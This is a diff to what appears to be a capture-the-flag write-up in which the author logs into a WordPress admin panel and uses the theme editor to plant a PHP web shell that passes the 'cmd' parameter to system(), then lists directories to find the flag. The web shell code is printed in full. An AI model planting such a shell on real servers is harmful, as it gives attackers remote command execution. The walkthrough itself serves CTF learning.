@@ -25,8 +25,9 @@ http://l.xyz was a web application which was running wordpress instance, while d
  <p> 
 then, i went to /wp-admin/ and logged into the admin account, we all thought that the flag would be inside the admin panel, but it was not there! where was it? suddenly i got an idea to shell the server, i went to themes, and added a .php file with the following code. </p>
 
+<code>
 <?
-<HT.ML>
+<HTML>
 <BODY>
 <FORM METHOD=”GET” NAME=”cmdform” ACTION=””>
 <INPUT TYPE=”text” NAME=”linux command”>
@@ -37,7 +38,8 @@ if($_GET[‘cmd’]) {
 system($_GET[‘cmd’]);
 }
 ?>
-</BODY></HTM.L>
+</BODY></HTML>
+</code>
   
 <p>
 and used ls, and some basic commands, and the flag was inside the /www2/ directory in a file called flag.txt
